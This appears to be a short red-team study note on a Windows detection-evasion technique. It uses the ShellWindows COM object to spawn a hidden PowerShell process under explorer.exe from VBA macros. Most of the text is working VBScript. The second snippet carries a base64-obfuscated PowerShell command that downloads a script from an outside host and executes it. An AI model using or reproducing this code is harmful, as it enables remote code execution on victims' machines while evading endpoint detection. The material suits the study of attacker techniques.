
Attackers can use COM objects to avoid parent/child detections that occur in scenarios like [[VBA Macros]]

#### 🖊️ Evasion

Using COM objects like `ShellWindows` `ShellBrowserWindow` we can hide the powershell process under explorer.

1) Basic powershell execution:

```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", Null, Null, Null, 0
```

2) Weaponizing it to call for a payload:

```
Set shellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
Set obj = shellWindows.Item()
obj.Document.Application.ShellExecute "powershell.exe", "-nop -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACIAKQA=", Null, Null, 0
```




#### ⚠ Opsec




### Properties
---
📆 created   {{29-02-2024}} 11:06
🏷️ tags: #redteam #crto 

---

